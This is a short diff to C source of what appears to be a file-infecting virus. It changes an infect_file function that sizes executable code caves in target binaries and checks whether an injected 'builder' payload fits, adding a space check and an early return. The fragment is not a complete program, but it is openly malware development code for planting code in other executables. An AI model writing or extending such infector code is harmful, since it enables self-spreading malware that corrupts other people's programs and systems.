@@ -447,7 +447,7 @@ infect_file(char *path) {
     }
 
     uint64_t provided_space = get_code_cave_space(code_caves, num);
-    uint64_t needed_space = get_full_needed_code_space(entries, scaffold_table_num) + builder_size;
+    uint64_t needed_space = get_full_needed_code_space(entries, scaffold_table_num) + builder_size + 8 + num * 16;
     print_number_nl(provided_space);
     print_number_nl(needed_space);
 
@@ -456,7 +456,7 @@ infect_file(char *path) {
         if (code_caves[i].is_executable)
             if (code_caves[i].size >= builder_size) big_enough_builder_space = 1;
     print_number_nl(big_enough_builder_space);
-    print_number_nl(1111111111);
+    if (!big_enough_builder_space) return 0;
 
     // -----------------------------------------------------------
     return (0);
